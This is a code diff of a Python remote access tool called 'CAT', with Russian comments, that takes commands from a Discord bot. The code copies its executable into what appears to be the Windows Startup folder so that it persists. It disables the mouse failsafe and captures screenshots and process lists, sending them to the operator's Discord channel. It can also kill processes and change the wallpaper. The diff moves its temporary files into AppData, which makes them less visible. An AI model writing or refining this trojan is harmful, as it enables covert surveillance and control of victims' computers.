@@ -18,7 +18,6 @@ from discord.ext import commands
 import config
 import nullfunction as nf
 
-
 pg.FAILSAFE = False  # делает невозможным прервать движение мышки
 bot = commands.Bot(command_prefix='/')  # префикс для комманд
 channel = bot.get_channel(config.channel)  # введите id канала в который должен писать бот
@@ -31,14 +30,14 @@ path = f'C:\\Users\\{win32api.GetUserName()}\\AppData\\Roaming\\Microsoft\\Windo
 async def on_ready():
     try:
 
-        with open(path+'CAT.exe') as f:
+        with open(path + 'CAT.exe') as f:
             pass
 
     except FileNotFoundError:
 
         with open('CAT.exe', 'rb') as f:
             data = f.read()
-        with open(path+'CAT.exe', 'wb') as f:
+        with open(path + 'CAT.exe', 'wb') as f:
             f.write(data)
 
     channel_start = bot.get_channel(config.channel)
@@ -84,9 +83,9 @@ async def click(ctx):  # кликнуть мышкой
 
 @bot.command()
 async def screenshot(ctx):  # сделать скриншот
-    pg.screenshot('screenshot.png')
-    await ctx.send(file=discord.File('screenshot.png'))
-    os.remove('screenshot.png')
+    pg.screenshot(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\screenshot.png')
+    await ctx.send(file=discord.File(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\screenshot.png'))
+    os.remove(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\screenshot.png')
 
 
 @bot.command()
@@ -161,13 +160,14 @@ async def kill(ctx, *, process):  # убить процесс
 
 @bot.command()
 async def processlist(ctx):  # список процессов
-    f = open('processlist.txt', 'w')
+    f = open(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\processlist.txt', 'w')
     try:
         data = subprocess.check_output(['tasklist'])
         f.write(str(data))
         f.close()
-        await ctx.send('**CAT:** Список процессов', file=discord.File('processlist.txt'))
-        os.remove('processlist.txt')
+        await ctx.send('**CAT:** Список процессов',
+                       file=discord.File(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\processlist.txt'))
+        os.remove(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\processlist.txt')
     except FileNotFoundError:
         await ctx.send('**CAT:** Данная команда только для Windows XP/7/8.1/10!')
 
@@ -223,14 +223,15 @@ async def off(ctx):  # выключение бота
 
 @bot.command()
 async def wallpaper(ctx, url):
+    with open(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\wallpaper.png', 'wb') as f:
+        f.write(nf.img_get(url))
 
-    with open('wallpaper.png', 'wb') as f:
-        f.write(nf.img_get(url+'.png'))
-
-    if ctypes.windll.user32.SystemParametersInfoW(20, 0, 'wallpaper.png', 0):
+    if ctypes.windll.user32.SystemParametersInfoW(20, 0,
+                                                  f'C:\\Users\\{win32api.GetUserName()}\\AppData\\wallpaper.png', 0):
         await ctx.send('**CAT:** Обои успешно изменены!')
     else:
         await ctx.send('**CAT:** Ошибка!')
-    os.remove('wallpaper.png')
+    os.remove(f'C:\\Users\\{win32api.GetUserName()}\\AppData\\wallpaper.png')
+
 
 bot.run(config.token)
